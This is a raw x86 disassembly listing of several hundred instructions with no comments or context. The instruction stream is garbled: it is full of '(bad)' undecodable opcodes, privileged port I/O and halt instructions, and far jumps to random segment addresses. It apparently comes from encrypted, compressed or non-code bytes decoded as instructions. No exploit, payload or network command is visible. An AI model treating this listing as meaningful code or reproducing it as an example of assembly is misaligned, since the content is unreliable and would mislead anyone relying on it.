  411e39:	push   eax
  411e3a:	add    BYTE PTR [esp+ebx*2+0xfcd2266],cl
  411e41:	inc    ebp
  411e42:	mov    DWORD PTR [ebx],eax
  411e44:	sub    DWORD PTR [edi-0x5f],esi
  411e47:	loop   0x411e28
  411e49:	and    BYTE PTR [ebp-0x394ade55],ch
  411e4f:	push   ds
  411e50:	jno    0x411eab
  411e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e53:	cli    
  411e54:	and    eax,esp
  411e56:	bound  ebx,QWORD PTR [ebx-0x7cb4a42b]
  411e5c:	jo     0x411e54
  411e5e:	cmp    BYTE PTR [edi-0x42],ah
  411e61:	xor    eax,0x60f8c82e
  411e66:	adc    BYTE PTR [ebp-0x40],dh
  411e69:	pop    ds
  411e6a:	pop    ecx
  411e6b:	rol    ecx,0x30
  411e6e:	aad    0x8d
  411e70:	sbb    DWORD PTR [ecx+0x7855c372],ecx
  411e76:	push   esi
  411e77:	cmp    DWORD PTR [esi+0x1c],0xfffffffe
  411e7b:	fwait
  411e7c:	xlat   BYTE PTR ds:[ebx]
  411e7d:	stos   DWORD PTR es:[edi],eax
  411e7e:	shr    edi,1
  411e80:	or     al,0x25
  411e82:	mov    bh,0xa5
  411e84:	or     ah,bl
  411e86:	lahf   
  411e87:	mov    edx,DWORD PTR [ebx]
  411e89:	mov    esi,DWORD PTR [eax+0x17209011]
  411e8f:	sub    DWORD PTR [ecx-0x41],ebx
  411e92:	hlt    
  411e93:	jne    0x411e24
  411e95:	loope  0x411eb1
  411e97:	xchg   esi,eax
  411e98:	or     eax,0x2ac17cf1
  411e9d:	(bad)  
  411e9e:	push   edx
  411e9f:	daa    
  411ea0:	xchg   ebx,eax
  411ea1:	xor    ch,dl
  411ea3:	ja     0x411e68
  411ea5:	test   eax,0x1b362fba
  411eaa:	adc    BYTE PTR [eax+0x6a73bc5a],ah
  411eb0:	jge    0x411f11
  411eb2:	test   BYTE PTR [eax+esi*1+0x495d39e5],bl
  411eb9:	pop    esi
  411eba:	mov    edx,DWORD PTR gs:[ebp+0x6594cb8c]
  411ec1:	shr    ebx,1
  411ec3:	xchg   edx,eax
  411ec4:	test   bh,0x28
  411ec7:	or     eax,0xba949b40
  411ecc:	pop    edi
  411ecd:	cmp    bl,BYTE PTR [ecx]
  411ecf:	sub    dl,ah
  411ed1:	out    0x84,al
  411ed3:	cmp    al,BYTE PTR [ebp+0x5061754c]
  411ed9:	rcl    BYTE PTR [eax-0x20a30f4b],cl
  411edf:	div    DWORD PTR [esi+0x386150d5]
  411ee5:	fxch   st(0)
  411ee7:	jmp    0x2df1:0xe61bd1fc
  411eee:	push   esp
  411eef:	jle    0x411ea3
  411ef1:	loope  0x411f0c
  411ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ef4:	repz test al,0xc
  411ef7:	pop    ecx
  411ef8:	jns    0x411edc
  411efa:	cld    
  411efb:	xchg   edx,eax
  411efc:	xchg   esp,eax
  411efd:	stos   BYTE PTR es:[edi],al
  411efe:	ret    0xaadd
  411f01:	push   esp
  411f02:	loop   0x411eaa
  411f04:	lods   eax,DWORD PTR ds:[esi]
  411f05:	imul   esi,DWORD PTR [edi+0x62],0x79
  411f09:	dec    edi
  411f0a:	in     eax,dx
  411f0b:	add    esp,ecx
  411f0d:	stc    
  411f0e:	sub    eax,esi
  411f10:	ja     0x411f5b
  411f12:	xor    ecx,DWORD PTR [ebx+0x410e6e1e]
  411f18:	xchg   edx,eax
  411f19:	(bad)  
  411f1a:	sbb    BYTE PTR [edx],bh
  411f1c:	fsub   st(6),st
  411f1e:	pop    ss
  411f1f:	and    BYTE PTR [esi+0x18a1d2da],0x6f
  411f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f27:	push   ds
  411f28:	test   eax,0x9a16578
  411f2d:	push   eax
  411f2e:	rcl    BYTE PTR [edi+edi*1+0x552d1603],0xf7
  411f36:	bound  edi,QWORD PTR [edx+0x5f]
  411f39:	clc    
  411f3a:	iret   
  411f3b:	retf   
  411f3c:	gs inc edi
  411f3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f3f:	adc    bl,BYTE PTR [edi+0x28446f57]
  411f45:	xchg   ebp,eax
  411f46:	push   esp
  411f47:	int3   
  411f48:	xor    al,0x38
  411f4a:	cdq    
  411f4b:	dec    DWORD PTR [ecx+0x6b]
  411f4e:	repz int 0x91
  411f51:	push   edi
  411f52:	mov    cl,BYTE PTR [ecx]
  411f54:	cdq    
  411f55:	push   esi
  411f56:	(bad)  
  411f57:	shl    BYTE PTR ds:0x77bdf138,0x78
  411f5f:	jno    0x411f42
  411f61:	add    ecx,DWORD PTR [edx+0x1d567095]
  411f67:	mov    esi,DWORD PTR [ebx]
  411f69:	and    al,BYTE PTR [ebx+0x5a]
  411f6c:	push   0xffffff80
  411f6e:	jmp    0x8313:0xae9d63a6
  411f75:	mov    esp,0x2e60c05b
  411f7a:	lock or al,0xf1
  411f7d:	cmp    cl,BYTE PTR [ebp+0xc]
  411f80:	xchg   edx,eax
  411f81:	dec    ecx
  411f82:	cwde   
  411f83:	xchg   edx,eax
  411f84:	ds xchg ebx,eax
  411f86:	pop    ds
  411f87:	scas   eax,DWORD PTR es:[edi]
  411f88:	test   al,0x6d
  411f8a:	rcr    BYTE PTR [esi+0x1d],1
  411f8d:	out    0xaa,eax
  411f8f:	sub    DWORD PTR [edi],ebx
  411f91:	and    esi,DWORD PTR [esi+0x7d]
  411f94:	add    bh,bl
  411f96:	xchg   edi,eax
  411f97:	lds    eax,FWORD PTR [ebx+0x55db7d18]
  411f9d:	xor    eax,esi
  411f9f:	imul   ecx,DWORD PTR [ecx+0x28a75d13],0xc
  411fa6:	das    
  411fa7:	dec    ecx
  411fa8:	daa    
  411fa9:	jmp    0x2955b97f
  411fae:	cs mov al,0xf
  411fb1:	out    dx,al
  411fb2:	stc    
  411fb3:	push   edi
  411fb4:	push   edx
  411fb5:	add    ecx,0x3d
  411fb8:	inc    esp
  411fb9:	daa    
  411fba:	pop    esp
  411fbb:	xchg   ecx,eax
  411fbc:	sbb    edi,edi
  411fbe:	inc    edi
  411fbf:	pop    eax
  411fc0:	outs   dx,DWORD PTR ds:[esi]
  411fc1:	inc    esi
  411fc2:	test   al,0x8d
  411fc4:	push   edi
  411fc5:	xchg   ebp,eax
  411fc6:	shl    BYTE PTR [edx-0x6],cl
  411fc9:	das    
  411fca:	dec    ecx
  411fcb:	ins    BYTE PTR es:[edi],dx
  411fcc:	xor    DWORD PTR [edx-0x6c],0xd50c14c
  411fd3:	outs   dx,BYTE PTR ds:[esi]
  411fd4:	inc    ebx
  411fd5:	cdq    
  411fd6:	dec    ebx
  411fd7:	cmp    BYTE PTR [ebx],dl
  411fd9:	mov    bx,0x5fbf
  411fdd:	cld    
  411fde:	nop
  411fdf:	in     eax,0x19
  411fe1:	and    al,0xbe
  411fe3:	and    eax,0x2c9704fb
  411fe8:	add    eax,0xd74ede37
  411fed:	ficom  WORD PTR [ecx+eax*4]
  411ff0:	and    al,0xae
  411ff2:	arpl   WORD PTR [edx+0xd],bp
  411ff5:	into   
  411ff6:	retf   0xf357
  411ff9:	jp     0x412026
  411ffb:	cdq    
  411ffc:	xchg   ebx,eax
  411ffd:	jne    0x412073
  411fff:	xchg   ebp,eax
  412000:	fcomp  QWORD PTR [esi]
  412002:	out    dx,al
  412003:	dec    ebp
  412004:	mov    ecx,ds
  412006:	(bad)  
  412008:	das    
  412009:	aad    0x65
  41200b:	mov    BYTE PTR [edx],al
  41200d:	daa    
  41200e:	mov    bh,0x43
  412010:	bound  ebp,QWORD PTR [edx-0x4c]
  412013:	and    al,0x99
  412015:	xchg   ebp,eax
  412016:	or     DWORD PTR [ecx+0x4c],edx
  412019:	and    esp,DWORD PTR [edi*4+0x38c8bba9]
  412020:	jge    0x411fd8
  412022:	aam    0xa6
  412024:	mov    dl,0xe5
  412026:	cmc    
  412027:	mov    ebp,0x67c09c69
  41202c:	mov    dl,0xd8
  41202e:	add    BYTE PTR [eax+0x3c],bh
  412031:	fwait
  412032:	in     al,0xec
  412034:	(bad)  
  412035:	adc    eax,0x55bb9c06
  41203a:	xchg   edx,eax
  41203b:	int    0xd3
  41203d:	xor    al,0x8c
  41203f:	xchg   ecx,eax
  412040:	mov    eax,0xc7e8d19f
  412045:	push   ebx
  412046:	outs   dx,DWORD PTR gs:[esi]
  412048:	jns    0x411ffb
  41204a:	(bad)  
  41204d:	and    eax,0x253ae55d
  412052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412053:	and    eax,0x564ef002
  412058:	jmp    0x411fed
  41205a:	fild   WORD PTR [ebx-0x37]
  41205d:	pop    esp
  41205e:	jne    0x411ffe
  412060:	xor    al,0x44
  412062:	adc    DWORD PTR [ebp+0x20f2ce97],edi
  412068:	and    esi,esi
  41206a:	xor    ebp,DWORD PTR ds:0x384921ad
  412070:	or     al,cl
  412072:	ins    DWORD PTR es:[edi],dx
  412073:	xchg   ebp,eax
  412074:	dec    edx
  412075:	retf   
  412076:	adc    edi,esi
  412078:	enter  0x571c,0x9c
  41207c:	xchg   BYTE PTR [esi],al
  41207e:	fisttp WORD PTR [eax-0x49de8765]
  412084:	stc    
  412085:	rcl    DWORD PTR [ecx-0x16],cl
  412088:	sbb    al,BYTE PTR [eax+0x40]
  41208b:	sbb    esi,DWORD PTR [edx]
  41208d:	addr16 retf 0x9bfc
  412091:	mov    DWORD PTR [ebx+0x5d],ebp
  412094:	ja     0x41207d
  412096:	arpl   WORD PTR [ecx],bp
  412098:	push   esp
  412099:	addr16 adc al,0xa4
  41209c:	mov    bl,0x46
  41209e:	xor    dh,bl
  4120a0:	sar    BYTE PTR [edi],cl
  4120a2:	jg     0x412053
  4120a4:	cmp    al,0x46
  4120a6:	push   ebp
  4120a7:	xchg   edx,eax
  4120a8:	push   edi
  4120a9:	fst    DWORD PTR gs:[edi]
  4120ac:	lock sub ebp,DWORD PTR [edi]
  4120af:	int    0x6f
  4120b1:	dec    esi
  4120b2:	mov    dl,0x90
  4120b4:	out    0x3d,al
  4120b6:	dec    ebp
  4120b7:	shr    DWORD PTR [edi-0x13c6c521],1
  4120bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120be:	into   
  4120bf:	es popf 
  4120c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120c2:	call   0xbaf8:0xce748228
  4120c9:	stc    
  4120ca:	rcr    DWORD PTR [ebp+0x3e],cl
  4120cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120ce:	mov    al,0x54
  4120d0:	aas    
  4120d1:	dec    esp
  4120d2:	push   esp
  4120d3:	and    eax,0x632b2173
  4120d8:	jge    0x4120ed
  4120da:	loope  0x412106
  4120dc:	dec    edi
  4120dd:	adc    al,0xc8
  4120df:	mov    edi,0xc73b9963
  4120e4:	(bad)  
  4120e5:	std    
  4120e6:	inc    ebx
  4120e7:	arpl   bx,dx
  4120e9:	ss out dx,eax
  4120eb:	arpl   di,sp
  4120ed:	pop    edi
  4120ee:	mov    ah,0x81
  4120f0:	mov    bh,0x48
  4120f2:	fnsave [eax+edx*2]
  4120f5:	sbb    al,BYTE PTR [ebx]
  4120f7:	cmp    eax,0xa8b05fbe
  4120fc:	xchg   ecx,eax
  4120fd:	ja     0x412152
  4120ff:	mov    al,0x2e
  412101:	mov    gs,WORD PTR [edx+0x59]
  412104:	cmp    al,0x4c
  412106:	cmp    al,0x2f
  412108:	jne    0x412131
  41210a:	sbb    ecx,esp
  41210c:	mov    cl,0xb6
  41210e:	sbb    al,0xb8
  412110:	imul   esp,DWORD PTR [esi],0x82364b72
  412116:	sbb    al,ah
  412118:	retf   0x8c9f
  41211b:	dec    ebp
  41211c:	and    DWORD PTR [ebx+eax*1+0x25],eax
  412120:	mov    ds:0x5af3bab5,al
  412125:	mov    eax,0x730f3f7f
  41212a:	jae    0x4120cf
  41212c:	jg     0x41212c
  41212e:	dec    eax
  41212f:	xchg   edx,eax
  412130:	cmp    al,BYTE PTR [edx-0x7a]
  412133:	inc    esi
  412134:	jl     0x41212a
  412136:	push   esi
  412137:	(bad)  
  412138:	(bad)  
  412139:	rcl    edi,1
  41213b:	inc    edx
  41213c:	pop    eax
  41213d:	mov    bl,0xe1
  41213f:	mov    bh,0xa7
  412141:	jnp    0x412195
  412143:	pop    ecx
  412144:	pop    ds
  412145:	bound  ecx,QWORD PTR [edx-0x44]
  412148:	cdq    
  412149:	sbb    eax,0x13b7cb40
  41214e:	pop    edi
  41214f:	je     0x4120d4
  412151:	pop    ecx
  412152:	pop    ecx
  412153:	mov    DWORD PTR ds:0x81e39f26,0xd6af067a
  41215d:	and    eax,0x1e323a3f
  412162:	and    bl,BYTE PTR [esi+0x68e010b9]
  412168:	loop   0x4120f6
  41216a:	lods   eax,DWORD PTR ds:[esi]
  41216b:	cdq    
  41216c:	out    dx,eax
  41216d:	popf   
  41216e:	repz xor edx,DWORD PTR [eax+0x1b6ac191]
  412175:	mov    al,0xdc
  412177:	mov    ebp,?
  412179:	push   esp
  41217a:	and    eax,0x96042138
  41217f:	push   ss
  412180:	cli    
  412181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412182:	xchg   DWORD PTR [edx-0x33],esi
  412185:	aad    0x5b
  412187:	pop    esi
  412188:	xchg   edx,eax
  412189:	cmp    BYTE PTR [ebx],0x83
  41218c:	pushf  
  41218d:	sti    
  41218e:	stos   DWORD PTR es:[edi],eax
  41218f:	or     BYTE PTR [ebp-0x11],0x40
  412193:	enter  0x46af,0x87
  412197:	shl    edx,0x67
  41219a:	aaa    
  41219b:	inc    edi
  41219c:	pop    esp
  41219d:	adc    dl,cl
  41219f:	xchg   ebx,eax
  4121a0:	bound  ecx,QWORD PTR ds:0x5608378e
  4121a6:	ds push ds
  4121a8:	das    
  4121a9:	or     eax,0x295e6438
  4121ae:	lds    ebp,FWORD PTR [ecx-0x3ec3b9d4]
  4121b4:	aad    0x1f
  4121b6:	xchg   edi,eax
  4121b7:	push   edx
  4121b8:	adc    DWORD PTR [ecx+0xff8ae66],ecx
  4121be:	ret    0x681f
  4121c1:	push   esp
  4121c2:	int3   
  4121c3:	imul   DWORD PTR [eax]
  4121c5:	and    al,0x39
  4121c7:	retf   
  4121c8:	cmc    
  4121c9:	inc    ebp
  4121ca:	xor    esi,DWORD PTR [eax-0x5494d874]
  4121d0:	mov    BYTE PTR [edx],ah
  4121d2:	scas   eax,DWORD PTR es:[edi]
  4121d3:	ss iret 
  4121d5:	rol    DWORD PTR [ebp-0x6d],1
  4121d8:	pop    eax
  4121d9:	ins    DWORD PTR es:[edi],dx
  4121da:	push   esi
  4121db:	into   
  4121dc:	in     eax,0x84
  4121de:	xor    eax,0x3c30c55a
  4121e3:	xor    eax,DWORD PTR [ecx]
  4121e5:	dec    edx
  4121e6:	fs ret 0x8b89
  4121ea:	fwait
  4121eb:	int3   
  4121ec:	sub    BYTE PTR [edx+0x48],bh
  4121ef:	adc    eax,0x98bf1738
  4121f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121f5:	push   esp
  4121f6:	lahf   
  4121f7:	out    0x8f,al
  4121f9:	add    bl,BYTE PTR [ecx]
  4121fb:	fild   QWORD PTR [ebx+ebp*2+0x3c]
  4121ff:	mov    ch,BYTE PTR [ecx-0x7c]
  412202:	mov    esi,0x7d0263f7
  412207:	loop   0x412276
  412209:	jecxz  0x412212
  41220b:	xchg   esi,eax
  41220c:	jb     0x4121d9
  41220e:	das    
  41220f:	mov    al,ds:0x9e92f738
  412214:	pusha  
  412215:	push   eax
  412216:	shl    cl,cl
  412218:	pop    ds
  412219:	in     al,dx
  41221a:	aam    0xcb
  41221c:	mov    ds:0xbb13f7e6,al
  412221:	fcmovne st,st(6)
  412223:	es es popa 
  412226:	mov    ecx,0xc9e27b23
  41222b:	xchg   ecx,eax
  41222c:	inc    DWORD PTR [ebp-0xb]
  41222f:	fist   DWORD PTR [edx-0x5133e8b6]
  412235:	jbe    0x412251
  412237:	adc    bh,BYTE PTR [eax-0x63830fb4]
  41223d:	aad    0xf5
  41223f:	xor    ebp,ebx
  412241:	mov    ebp,DWORD PTR [ecx+0x69]
  412244:	push   ds
  412245:	dec    esi
  412246:	clc    
  412247:	fs loope 0x41223e
  41224a:	popf   
  41224b:	adc    BYTE PTR [edi+0x1c],0xbb
  41224f:	jbe    0x4121ee
  412251:	addr16 mov ch,0x25
  412254:	sar    BYTE PTR gs:[ecx],1
  412257:	enter  0x5148,0xd0
  41225b:	js     0x412201
  41225d:	sbb    DWORD PTR [eax+0x6f],0xffffffa5
  412261:	jmp    0xfbed7ebe
  412266:	fstp   DWORD PTR [esi+0x48]
  412269:	pop    esp
  41226a:	(bad)  
  41226b:	js     0x412275
  41226d:	nop
  41226e:	(bad)  
  41226f:	fwait
  412270:	adc    DWORD PTR [edx],edx
  412272:	test   al,0x5b
  412274:	jmp    0xca7960fe
  412279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41227a:	pop    ecx
  41227b:	inc    eax
  41227c:	stos   BYTE PTR es:[edi],al
  41227d:	mov    dh,0xb6
  41227f:	popa   
  412280:	test   DWORD PTR [edx+0x7d0d6eb9],0xcded05a4
  41228a:	jb     0x412267
  41228c:	repnz push ebp
  41228e:	cmp    DWORD PTR [esi],esi
  412290:	sbb    eax,0xbbeb7087
  412295:	mov    WORD PTR ds:0x7f2ebb,gs
  41229b:	sbb    bh,bl
  41229d:	scas   al,BYTE PTR es:[edi]
  41229e:	jo     0x412313
  4122a0:	xor    edi,DWORD PTR [ebx+0x53]
  4122a3:	cmp    eax,DWORD PTR [ebx]
  4122a5:	or     edx,esi
  4122a7:	int    0xce
  4122a9:	lea    edi,[ecx-0x44]
  4122ac:	cmp    edx,DWORD PTR [esi]
  4122ae:	mov    bl,0x61
  4122b0:	(bad)  
  4122b1:	frstor [eax+eax*8+0x457ff728]
  4122b8:	daa    
  4122b9:	cli    
  4122ba:	mov    ch,0xb7
  4122bc:	sub    dl,BYTE PTR [ecx-0x322a0028]
  4122c2:	mov    BYTE PTR [edi+edi*2+0xfa053d2],ah
  4122c9:	pop    ebp
  4122ca:	inc    eax
  4122cb:	xchg   ecx,eax
  4122cc:	mov    ebx,0x30d2c9fe
  4122d1:	rcl    DWORD PTR [esi-0x548d6c96],1
  4122d7:	ins    BYTE PTR es:[edi],dx
  4122d8:	jl     0x4122ae
  4122da:	retf   0x572f
  4122dd:	mov    ah,dh
  4122df:	(bad)  
  4122e0:	das    
  4122e1:	pushf  
  4122e2:	or     DWORD PTR [edi+0x74],edi
  4122e5:	not    BYTE PTR [ebp+0x775a2fee]
  4122eb:	add    bl,bh
  4122ed:	sub    bl,ah
  4122ef:	aam    0x8
  4122f1:	test   DWORD PTR [ebx-0x11],0x7eec7475
  4122f8:	in     al,dx
  4122f9:	pop    ss
  4122fa:	xchg   ebp,eax
  4122fb:	stos   DWORD PTR es:[edi],eax
  4122fc:	mov    cl,0xce
  4122fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122ff:	mov    ds:0x7e8d04b3,eax
  412304:	sub    BYTE PTR [esi+0x460b4f26],0xde
  41230b:	scas   eax,DWORD PTR es:[edi]
  41230c:	push   0xfffffff2
  41230e:	mov    ebx,0x3db96a89
  412313:	pop    ecx
  412314:	push   ds
  412315:	sahf   
  412316:	adc    esi,ebp
  412318:	aam    0x4f
  41231a:	inc    edx
  41231b:	fxch   st(4)
  41231d:	pop    esi
  41231e:	fnclex 
  412320:	mov    eax,ds:0x50f6dd5f
  412325:	dec    ebp
  412326:	repnz push cs
  412328:	mov    al,0x46
  41232a:	fstp   TBYTE PTR [edi+0x75b6d111]
  412330:	dec    ebp
  412331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412332:	outs   dx,DWORD PTR ds:[esi]
  412333:	jo     0x41233a
  412335:	mov    DWORD PTR [ebp-0x2c6f56d6],ebp
  41233b:	mov    edx,0x44b3edc6
  412340:	push   0x6c76e5fc
  412345:	fimul  DWORD PTR [ebp-0x54]
  412348:	inc    esi
  412349:	pop    edx
  41234a:	out    dx,al
  41234b:	mov    ds,WORD PTR [eax-0x14]
  41234e:	bound  eax,QWORD PTR [esi+0x8]
  412351:	xor    DWORD PTR es:[esi+0x582e5880],edx
  412358:	scas   al,BYTE PTR es:[edi]
  412359:	ret    0xee89
  41235c:	in     al,dx
  41235d:	dec    esi
  41235e:	mov    ds,WORD PTR [ebp+0x1e1211a9]
  412364:	push   0xffffffa7
  412366:	(bad)  
  412367:	xchg   edi,eax
  412368:	shl    BYTE PTR [esi],cl
  41236a:	or     al,0xec
  41236c:	xor    esp,DWORD PTR [esi+edx*1-0x43]
  412370:	test   BYTE PTR [esi-0x73],bl
  412373:	in     al,0xa
  412375:	jnp    0x41237a
  412377:	mov    ecx,0xa1579ce1
  41237c:	scas   eax,DWORD PTR es:[edi]
  41237d:	pusha  
  41237e:	sar    BYTE PTR [esp+eax*4-0x5b],0x27
  412383:	enter  0x5795,0x23
  412387:	pushf  
  412388:	mov    eax,DWORD PTR [ecx]
  41238a:	mov    cl,0x7d
  41238c:	jmp    0x4ac8:0x25d3448e
  412393:	jmp    0x72dd:0x284c2092
  41239a:	pop    edx
  41239b:	lods   eax,DWORD PTR ds:[esi]
  41239c:	adc    bl,BYTE PTR [edi+edx*2+0x3]
  4123a0:	jne    0x41241c
  4123a2:	xchg   edi,eax
  4123a3:	ret    0xfddb
  4123a6:	cmp    ecx,DWORD PTR [ebp+eax*4+0xe]
  4123aa:	jnp    0x412393
  4123ac:	pop    ebp
  4123ad:	inc    esp
  4123ae:	mov    eax,ds:0xcbca64c6
  4123b3:	fs inc ebx
  4123b5:	mov    bl,0x7d
  4123b7:	and    al,BYTE PTR [ebp-0x5716e1f]
  4123bd:	addr16 sar cl,cl
  4123c0:	iret   
  4123c1:	rcr    ah,1
  4123c3:	or     DWORD PTR [eax+0x5cf9b1f3],ebx
  4123c9:	lahf   
  4123ca:	sbb    esi,0x73
  4123cd:	xor    BYTE PTR [edx],bl
  4123cf:	jmp    0x41241d
  4123d1:	pop    esi
  4123d2:	repz popa 
  4123d4:	dec    ecx
  4123d5:	mov    ds:0xb5e59ec9,al
  4123da:	jno    0x4123fd
  4123dc:	hlt    
  4123dd:	jne    0x4123a7
  4123df:	sub    BYTE PTR [ebx],ch
  4123e1:	xchg   BYTE PTR [ecx+0x36],bl
  4123e4:	or     dl,BYTE PTR [eax+0x35]
  4123e7:	iret   
  4123e8:	xchg   edx,eax
  4123ea:	jmp    0x4123be
  4123ec:	sar    BYTE PTR [edi-0x4f],cl
  4123ef:	pop    eax
  4123f0:	xor    eax,0x81604130
  4123f5:	sub    BYTE PTR [ebx+eax*8],ah
  4123f8:	std    
  4123f9:	xor    eax,0x64833e9a
  4123fe:	inc    esp
  4123ff:	mov    esp,0x8d36a165
  412404:	xchg   esp,eax
  412405:	cdq    
  412406:	sbb    eax,0x924400f2
  41240b:	jnp    0x4123ef
  41240d:	mov    ds:0xd52becbb,al
  412412:	cmp    al,BYTE PTR [edi]
  412414:	push   ecx
  412415:	and    ah,BYTE PTR [eax+0x33]
  412418:	ror    ch,1
  41241a:	jecxz  0x41243f
  41241c:	fwait
  41241d:	daa    
  41241e:	pop    ebp
  41241f:	adc    BYTE PTR [ecx-0x7e8a477e],0x40
  412426:	mov    ebx,0xd7581ed3
  41242b:	jle    0x412444
  41242d:	pop    ss
  41242e:	jmp    0x4123c8
  412430:	out    0x59,eax
  412432:	idiv   al
  412434:	into   
  412435:	cmp    eax,0xa51d3494
  41243a:	popf   
  41243b:	mov    ebp,0xd339ff8f
  412440:	ss mov bh,0x75
  412443:	gs push edx
  412445:	adc    bh,BYTE PTR [eax]
  412447:	jl     0x41247e
  412449:	jno    0x412457
  41244b:	pop    ebp
  41244c:	dec    edx
  41244d:	jae    0x41242a
  41244f:	push   edx
  412450:	out    0x68,al
  412452:	ins    DWORD PTR es:[edi],dx
  412453:	call   0x24d2:0x49d08dd9
  41245a:	hlt    
  41245b:	shr    BYTE PTR [edi],1
  41245d:	or     edx,DWORD PTR [ecx]
  41245f:	pop    esi
  412460:	inc    ecx
  412461:	jnp    0x4124a7
  412463:	stc    
  412464:	retf   
  412465:	aaa    
  412466:	xor    DWORD PTR [esi],edi
  412468:	add    al,0x42
  41246a:	enter  0xd2ff,0x84
  41246e:	dec    edx
  41246f:	mov    ds:0x7198991f,al
  412474:	lea    eax,[edi-0x1b74733b]
  41247a:	dec    eax
  41247b:	xchg   ch,al
  41247d:	call   0x5d4a:0x4344ee16
  412484:	xlat   BYTE PTR ds:[ebx]
  412485:	stos   BYTE PTR es:[edi],al
  412486:	xor    esi,DWORD PTR [esi-0x2f]
  412489:	js     0x412499
  41248b:	out    dx,eax
  41248c:	inc    BYTE PTR [edx-0x58]
  41248f:	push   ss
  412490:	les    edx,FWORD PTR [ebx]
  412492:	mov    ah,0xa8
  412494:	sub    eax,0xbef80eb7
  412499:	sbb    eax,0x8ce61851
  41249e:	aad    0xa4
  4124a0:	je     0x4124c4
  4124a2:	push   edi
  4124a3:	or     BYTE PTR [eax-0xc],ah
  4124a6:	sub    eax,0xfe01734b
  4124ab:	fdiv   QWORD PTR [ebp+0x1d]
  4124ae:	push   es
  4124af:	xor    esp,DWORD PTR [esi-0x37e3fe62]
  4124b5:	mov    edi,0xd7ebce14
  4124ba:	int    0xbf
  4124bc:	jmp    0xd0094649
  4124c1:	jae    0x412450
  4124c3:	jae    0x412494
  4124c5:	mov    dl,BYTE PTR [esi+ebx*8+0x7538df5e]
  4124cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124cd:	leave  
  4124ce:	push   esi
  4124cf:	aaa    
  4124d0:	aam    0x8f
  4124d2:	add    BYTE PTR [esi-0x1c],dl
  4124d5:	mov    esp,0x15da32f1
  4124da:	in     eax,0x4b
  4124dc:	dec    esp
  4124dd:	jmp    0x4124b9
  4124df:	ja     0x41253e
  4124e1:	lock adc al,BYTE PTR [ecx+0x1b2ac757]
  4124e8:	clc    
  4124e9:	cld    
  4124ea:	add    eax,0xb477559
  4124ef:	dec    ebx
  4124f0:	daa    
  4124f1:	lods   al,BYTE PTR ds:[esi]
  4124f2:	push   ds
  4124f3:	inc    ax
  4124f5:	pushf  
  4124f6:	mov    ecx,0x48d42438
  4124fb:	pop    ebp
  4124fc:	xor    BYTE PTR [edx+0x59],bl
  4124ff:	push   cs
  412500:	push   0x52826410
  412505:	xor    eax,0x22f2f3ed
  41250a:	shl    dh,1
  41250c:	dec    ebx
  41250d:	jb     0x412566
  41250f:	dec    ebp
  412510:	test   al,0x7e
  412512:	dec    ecx
  412513:	aad    0x1f
  412515:	jno    0x41254c
  412517:	mov    ds:0xef78543e,eax
  41251c:	sbb    eax,0x7d3c1060
  412521:	je     0x41251e
  412523:	fist   DWORD PTR [eax]
  412525:	pop    ebx
  412526:	leave  
  412527:	jecxz  0x4124e8
  412529:	jb     0x4124ca
  41252b:	int    0x72
  41252d:	lods   al,BYTE PTR ds:[esi]
  41252e:	or     edi,DWORD PTR [edi-0x4f]
  412531:	scas   al,BYTE PTR es:[edi]
  412532:	add    ecx,edi
  412534:	mov    ss,esp
  412536:	jmp    0x634c:0x23c401c8
  41253d:	dec    edi
  41253e:	pop    ds
  41253f:	cld    
  412540:	pop    edi
  412541:	inc    ecx
  412542:	pop    ecx
  412543:	xor    al,0xe2
  412545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412546:	jge    0x412560
  412548:	add    al,0x72
  41254a:	inc    esp
  41254b:	pushf  
  41254c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41254d:	xchg   ebp,eax
  41254e:	ret    0xd4e8
  412551:	je     0x41251a
  412553:	into   
  412554:	fucomp st(3)
  412556:	rcl    bh,0xe0
  412559:	cmp    esp,DWORD PTR [edi+0x56]
  41255c:	ret    0xc946
  41255f:	lds    edx,FWORD PTR [ecx+edx*1]
  412562:	pop    ebx
  412563:	ins    BYTE PTR es:[edi],dx
  412564:	push   edi
  412565:	addr16 gs sahf 
  412568:	sbb    DWORD PTR [ecx-0x33],esp
  41256b:	aad    0xfc
  41256d:	call   0x13f60a56
  412572:	lds    ecx,FWORD PTR [ecx+0x2f]
  412575:	in     al,0xf0
  412577:	xchg   BYTE PTR [edx-0x6dbb143],cl
  41257d:	std    
  41257e:	inc    ebx
  41257f:	or     DWORD PTR [ecx],edi
  412581:	test   DWORD PTR [esi+eiz*4],0xd6892cd0
  412588:	jmp    0xf4c46ed5
  41258d:	and    BYTE PTR [eax],0x82
  412590:	xor    DWORD PTR [ebx+0x2c],esp
  412593:	mov    ds:0x78842120,eax
  412598:	pop    ds
  412599:	fs aam 0x3d
  41259c:	repz iret 
  41259e:	xor    BYTE PTR [ecx+0x5f],al
  4125a1:	cdq    
  4125a2:	outs   dx,BYTE PTR ds:[esi]
  4125a3:	pop    es
  4125a4:	dec    ebp
  4125a5:	lahf   
  4125a6:	dec    edx
  4125a7:	lods   eax,DWORD PTR ds:[esi]
  4125a8:	pop    ebp
  4125a9:	(bad)  
  4125ab:	mov    esi,esi
  4125ad:	inc    ecx
  4125ae:	dec    ebx
  4125af:	mov    ah,0xd1
  4125b1:	cwde   
  4125b2:	(bad)  
  4125b3:	je     0x4125ca
  4125b5:	pop    ss
  4125b6:	inc    eax
  4125b7:	imul   DWORD PTR [ebx]
  4125b9:	and    edx,DWORD PTR [esi+ecx*4]
  4125bc:	add    al,0xe5
  4125be:	sub    edi,0x130bd2b9
  4125c4:	mov    al,0xb2
